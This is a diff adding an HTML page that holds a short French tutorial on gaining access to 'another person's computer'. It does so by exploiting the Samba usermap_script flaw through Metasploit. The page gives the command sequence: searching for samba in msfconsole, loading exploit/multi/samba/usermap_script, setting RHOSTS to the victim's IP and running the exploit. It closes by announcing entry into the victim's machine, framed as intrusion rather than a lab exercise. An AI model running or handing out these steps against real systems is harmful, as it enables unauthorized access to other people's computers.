@@ -1,0 +1,27 @@
+<h1><b>Comment avoir accès à l'ordinateur d'un autre ?</b></h1>
+
+<h2> <U>Voici un tutoriel afin d'avoir accès au PC d'un autre en exploitant la faille Samba</U> </h2>
+
+<p> Dans ce tutoriel, nous allons exploiter une faille sur le service Samba, pour cela nous allons utiliser metasploitable-framework.<br><br>
+
+Dans un premier temps, nous allons chercher samba dans la console msfconsole</p>
+
+<img src="Tutoriel/tuto-samba/samba1.jpg" alt="" class="img-fluid">
+    
+<p>	Ensuite, nous allons utiliser la commande use exploit/multi/samba/usermap_script :</p>
+
+<img src="Tutoriel/tuto-samba/samba2.jpg" alt="" class="img-fluid">
+
+<p>	Puis, nous allons utiliser la commande show options pour voir les options possibles pour cette faille :</p>
+
+<img src="Tutoriel/tuto-samba/samba3.jpg" alt="" class="img-fluid">
+
+<p>Nous allons utiliser la commande set RHOSTS IP_de_la_victime :
+
+<img src="Tutoriel/tuto-samba/samba4.jpg" alt="" class="img-fluid">
+
+<p>Pour finir, nous allons utiliser la commande exploit ou run pour exploiter la faille : </p>
+
+<img src="Tutoriel/tuto-samba/samba5.jpg" alt="" class="img-fluid">
+
+<p>Maintenant, nous pouvons voir que nous sommes entrés dans la machine de la victime. </p>
